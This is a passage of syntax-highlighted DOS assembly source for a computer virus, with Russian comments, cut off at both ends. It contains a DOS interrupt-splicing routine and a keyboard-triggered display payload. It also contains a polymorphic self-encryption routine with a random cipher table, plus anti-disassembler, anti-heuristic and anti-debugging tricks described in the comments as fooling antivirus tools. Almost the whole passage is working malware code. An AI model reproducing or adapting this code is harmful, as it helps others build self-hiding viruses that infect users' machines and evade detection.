        </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">60h</span><span class="sc0">                 </span><span class="sc1">; читать скан-код</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">                 </span><span class="sc1">; клавишу отпустили?</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">quit_9</span><span class="sc0">                 </span><span class="sc1">; нет: выходим</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">point</span><span class="sc0">               </span><span class="sc1">; иначе считаем текущий указатель</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">                </span><span class="sc1">; следующая буква подходит?</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">zero_pointer</span><span class="sc0">           </span><span class="sc1">; нет: обнулить указатель и выйти</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">                     </span><span class="sc1">; подходит. инкрементировать указатель</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">keyword</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc0">    </span><span class="sc1">; все 6 букв были нажаты?</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">save_it</span><span class="sc0">                </span><span class="sc1">; нет: сохранить это значение</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc0">
        </span><span class="sc6">out</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">10h</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc5">smb_pattern</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc12">'1'</span><span class="sc0">
 </span><span class="sc5">modify_keygen</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1100h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">0e00h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">10h</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc2">0eh</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc12">'6'</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">modify_keygen</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">100000b</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">10h</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0b800h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">endcopy</span><span class="sc4">-</span><span class="sc5">copy</span><span class="sc0">

 </span><span class="sc5">Im_here</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">copy</span><span class="sc4">+</span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">Im_here</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc0">

 </span><span class="sc5">zero_pointer</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">keyword</span><span class="sc0">      </span><span class="sc1">; обнуляем указатель</span><span class="sc0">
 </span><span class="sc5">save_it</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">point</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">        </span><span class="sc1">; а тута сохраняем его</span><span class="sc0">
 </span><span class="sc5">quit_9</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">              </span><span class="sc1">; восстанавливаем всякое дерьмо</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">io9</span><span class="sc0">

══════════════════════════════════════════════════════════════════════════════
 </span><span class="sc5">ireturn</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">restorehost</span><span class="sc0">             </span><span class="sc1">; re-сплайсинг</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">buffer</span><span class="sc0">      </span><span class="sc1">; garbage</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">buffer</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">buffer</span><span class="sc0">
        </span><span class="sc6">retf</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0">

══════════════════════════════════════════════════════════════════════════════
 </span><span class="sc5">exithandler</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                </span><span class="sc1">; сохранить регистры</span><span class="sc0">
        </span><span class="sc6">lds</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">_addr21</span><span class="sc0"> </span><span class="sc1">; считать адрес</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">splint</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0cdh</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">keepword</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">resthost</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">2</span><span class="sc0">       </span><span class="sc1">; откорректировать точку</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc0">                      </span><span class="sc1">; возврата</span><span class="sc0">
        </span><span class="sc6">iret</span><span class="sc0">                            </span><span class="sc1">; finita la comedia</span><span class="sc0">
                                        </span><span class="sc1">; (вроде так)</span><span class="sc0">

══════════════════════════════════════════════════════════════════════════════
 </span><span class="sc5">restorehost</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                </span><span class="sc1">; сохранить регистры</span><span class="sc0">
        </span><span class="sc6">lds</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">io21</span><span class="sc0">    </span><span class="sc1">; дать адрес обработчика</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">splint</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0cdh</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">                 </span><span class="sc1">; состосить вызов there</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">                </span><span class="sc1">; восситановить регистры</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
</span><span class="sc1">; Подпрограмма за/раз-шифровки части вируса</span><span class="sc0">
</span><span class="sc1">; Использует XOR/ADD/SUB/NOT/INC/DEC/ROR/ROL/NEG шифровщики</span><span class="sc0">
</span><span class="sc1">; Случайный ключ</span><span class="sc0">
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 </span><span class="sc5">crypt</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">                           </span><span class="sc1">; сохранить используемые регистры</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">

 </span><span class="sc5">foolsr</span><span class="sc4">:</span><span class="sc0">                                </span><span class="sc1">; наебка для дизассемблера</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">01ebh</span><span class="sc0">                </span><span class="sc1">; перекрывающийся код</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">02ebh</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">3ebh</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">4ebh</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2ebh</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">foolsr</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">extra</span><span class="sc0">                   </span><span class="sc1">; вычислить экстра-смещение</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">                       </span><span class="sc1">; наебка эвристика</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">21h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">                </span><span class="sc1">; будто terminate, а еще и антидЭбаг</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">fool_antiv</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0b4h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
 </span><span class="sc5">cc?</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0fa01h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">30h</span><span class="sc0">

 </span><span class="sc5">fool_antiv</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">cc?</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc2">0cch</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">bug</span><span class="sc0">

        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">19h</span><span class="sc0">

 </span><span class="sc5">bug</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0b0h</span><span class="sc0">                    </span><span class="sc1">; расшифровываем главный</span><span class="sc0">
 </span><span class="sc5">pre_ki</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">000h</span><span class="sc0">                    </span><span class="sc1">; механизм</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">crmain</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">endcr</span><span class="sc4">-</span><span class="sc5">crmain</span><span class="sc0">
 </span><span class="sc5">de_cr</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">              </span><span class="sc1">; простым ксором</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">de_cr</span><span class="sc0">

 </span><span class="sc5">crmain</span><span class="sc4">:</span><span class="sc0">                                </span><span class="sc1">; главный механизм</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">overtable</span><span class="sc0">

 </span><span class="sc5">algorithm</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0">   </span><span class="sc2">9090h</span><span class="sc0">                   </span><span class="sc1">; алгоритм</span><span class="sc0">
 </span><span class="sc5">crtable</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0">  </span><span class="sc10">word</span><span class="sc0">                    </span><span class="sc1">; таблица зашифровщиков</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">not</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc0">
        </span><span class="sc6">ror</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">rol</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">neg</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc0">

 </span><span class="sc5">decrtable</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0">                   </span><span class="sc1">; таблица расшифровщиков</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">not</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc0">
        </span><span class="sc6">rol</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">ror</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">neg</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc0">

 </span><span class="sc5">overtable</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0ebh</span><span class="sc4">,</span><span class="sc5">decrypt</span><span class="sc4">-</span><span class="sc5">overtable</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">

        </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                  </span><span class="sc1">; получить случайное число</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">9</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">9</span><span class="sc0">
        </span><span class="sc6">cbw</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">crtable</span><span class="sc4">+</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; взять зашифровщик</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">algorithm</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">value</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">

 </span><span class="sc5">decrypt</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">algorithm</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">208h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">0cbh</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">overtable</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc5">decrypt</span><span class="sc4">-</span><span class="sc5">overtable</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">enc_start</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc0">          </span><span class="sc1">; инициализация</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">crypt</span><span class="sc4">-</span><span class="sc5">enc_start</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0b0h</span><span class="sc0">
 </span><span class="sc5">value</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">

 </span><span class="sc5">decrvirus</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; наконец-то!!!</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">09ah</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">208h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">dl</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">decrvirus</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">208h</span><span class="sc4">]</span><span class="sc0">

 </span><span class="sc5">endcr</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">decrtable</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">algorithm</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">

